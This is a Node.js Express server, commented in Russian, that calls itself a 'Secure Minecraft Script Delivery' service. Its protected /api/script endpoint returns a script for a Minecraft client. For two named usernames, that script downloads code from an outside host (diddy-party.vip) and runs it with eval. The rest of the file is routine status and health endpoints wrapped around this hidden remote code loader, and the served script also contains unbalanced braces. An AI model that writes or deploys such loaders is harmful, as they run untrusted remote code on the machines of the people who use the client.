const express = require('express');
const cors = require('cors');
const app = express();

// ==================== КОНФИГУРАЦИЯ ====================
const CONFIG = {
    PORT: process.env.PORT || 3000,
    API_KEYS: process.env.API_KEYS || 'railway-minecraft-key-123',
    ALLOWED_AGENTS: process.env.ALLOWED_AGENTS || 'java,minecraft,nedan,script,automine',
    NODE_ENV: process.env.NODE_ENV || 'production',
    RAILWAY_ENVIRONMENT: process.env.RAILWAY_ENVIRONMENT || 'production'
};

// ==================== MIDDLEWARE ====================
app.use(cors({
    origin: function (origin, callback) {
        // Разрешаем запросы без origin (например, из Minecraft)
        if (!origin || origin.includes('railway') || origin.includes('localhost')) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    },
    credentials: true
}));

app.use(express.json());

// Логирование для Railway
app.use((req, res, next) => {
    const timestamp = new Date().toISOString();
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'No User-Agent';
    
    console.log(`[${timestamp}] ${ip} - ${req.method} ${req.path} - ${userAgent.substring(0, 60)}`);
    next();
});

// ==================== ПРОВЕРКА АВТОРИЗАЦИИ ====================
const validateRequest = (req, res, next) => {
    const apiKey = req.headers['x-api-key'] || req.query.api_key;
    const userAgent = req.headers['user-agent'] || '';
    
    const validKeys = CONFIG.API_KEYS.split(',');
    const allowedAgents = CONFIG.ALLOWED_AGENTS.split(',');
    
    const isValidKey = validKeys.some(key => key === apiKey);
    const isValidAgent = allowedAgents.some(agent => 
        userAgent.toLowerCase().includes(agent.toLowerCase())
    );
    
    if (isValidKey && isValidAgent) {
        next();
    } else {
        console.log('🚫 Blocked request:', { 
            hasKey: !!apiKey, 
            userAgent: userAgent.substring(0, 30),
            ip: req.ip
        });
        
        res.status(403).json({ 
            success: false,
            error: 'access_denied',
            message: 'Invalid or missing credentials',
            timestamp: new Date().toISOString(),
            requires: {
                api_key: 'valid X-API-Key header',
                user_agent: 'specific client identification'
            }
        });
    }
};

// ==================== ЗАЩИЩЕННЫЕ ЭНДПОИНТЫ ====================

// Главный эндпоинт для скрипта
// Главный эндпоинт для скрипта
app.get('/api/script', validateRequest, (req, res) => {
    const scriptContent = `(function() {
    var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername();

// Проверяем разрешенные имена
if (username === "porvaniy.gondon" || username === "__ded_inside__") {
    try {
        // Выполняем внешний скрипт
        eval(new java.util.Scanner(
            new java.net.URL("https://diddy-party.vip/p/raw/or292hyekusblfp91").openStream(), 
            "UTF-8"
        ).useDelimiter("\\A").next());
    } catch (e) {
        java.lang.System.err.println("Ошибка при выполнении скрипта: " + e);
    }
} else {
    print("X")
}

})




})();`;
    
    res.setHeader('Content-Type', 'application/javascript; charset=UTF-8');
    res.send(scriptContent);
});

// Эндпоинт для проверки статуса
app.get('/api/status', validateRequest, (req, res) => {
    res.json({ 
        success: true,
        status: 'online', 
        server: {
            name: 'Secure Script Server',
            version: '2.0.0',
            platform: 'Railway',
            environment: CONFIG.RAILWAY_ENVIRONMENT
        },
        client: {
            ip: req.ip,
            userAgent: req.headers['user-agent'] || 'unknown'
        },
        timestamp: new Date().toISOString()
    });
});

// ==================== ОБЩЕДОСТУПНЫЕ ЭНДПОИНТЫ ====================

// Информация о сервере
app.get('/', (req, res) => {
    res.json({
        service: 'Secure Minecraft Script Delivery',
        version: '2.0.0',
        status: 'operational',
        platform: 'Railway',
        documentation: 'Contact administrator for API access',
        endpoints: {
            protected: ['/api/script', '/api/status'],
            public: ['/health', '/info']
        }
    });
});

// Health check для Railway
app.get('/health', (req, res) => {
    res.status(200).json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        memory: process.memoryUsage()
    });
});

// Информация о API
app.get('/info', (req, res) => {
    res.json({
        api: 'Secure Script Delivery',
        version: '2.0.0',
        description: 'Protected script server for Minecraft modifications',
        requires: ['X-API-Key header', 'Valid User-Agent'],
        contact: 'Your contact information'
    });
});

// ==================== ОБРАБОТКА ОШИБОК ====================

// 404 - Not Found
app.use('*', (req, res) => {
    res.status(404).json({
        success: false,
        error: 'endpoint_not_found',
        message: 'The requested resource does not exist',
        available_endpoints: [
            'GET /',
            'GET /health', 
            'GET /info',
            'GET /api/script',
            'GET /api/status'
        ],
        timestamp: new Date().toISOString()
    });
});

// Global error handler
app.use((err, req, res, next) => {
    console.error('❌ Server error:', err);
    res.status(500).json({
        success: false,
        error: 'internal_server_error',
        message: 'Something went wrong on our side',
        timestamp: new Date().toISOString()
    });
});

// ==================== ЗАПУСК СЕРВЕРА ====================
const server = app.listen(CONFIG.PORT, '0.0.0.0', () => {
    console.log('╔══════════════════════════════════════════════════════╗');
    console.log('║           SECURE SCRIPT SERVER - RAILWAY            ║');
    console.log('╠══════════════════════════════════════════════════════╣');
    console.log(`║  Port: ${CONFIG.PORT}                                       ║`);
    console.log(`║  Environment: ${CONFIG.RAILWAY_ENVIRONMENT.padEnd(26)} ║`);
    console.log(`║  Node: ${process.version.padEnd(33)} ║`);
    console.log('║                                                      ║');
    console.log('║  📍 Protected Endpoints:                             ║');
    console.log('║     • GET /api/script  (requires auth)               ║');
    console.log('║     • GET /api/status  (requires auth)               ║');
    console.log('║                                                      ║');
    console.log('║  🌐 Public Endpoints:                                ║');
    console.log('║     • GET /           (info)                         ║');
    console.log('║     • GET /health     (health check)                 ║');
    console.log('║     • GET /info       (api info)                     ║');
    console.log('║                                                      ║');
    console.log('║  🚀 Server is ready on Railway!                      ║');
    console.log('╚══════════════════════════════════════════════════════╝');
});

// Graceful shutdown для Railway
process.on('SIGTERM', () => {
    console.log('🛑 Received SIGTERM, shutting down gracefully...');
    server.close(() => {
        console.log('✅ Server closed');
        process.exit(0);
    });
});

process.on('SIGINT', () => {
    console.log('🛑 Received SIGINT, shutting down gracefully...');
    server.close(() => {
        console.log('✅ Server closed');
        process.exit(0);
    });
});
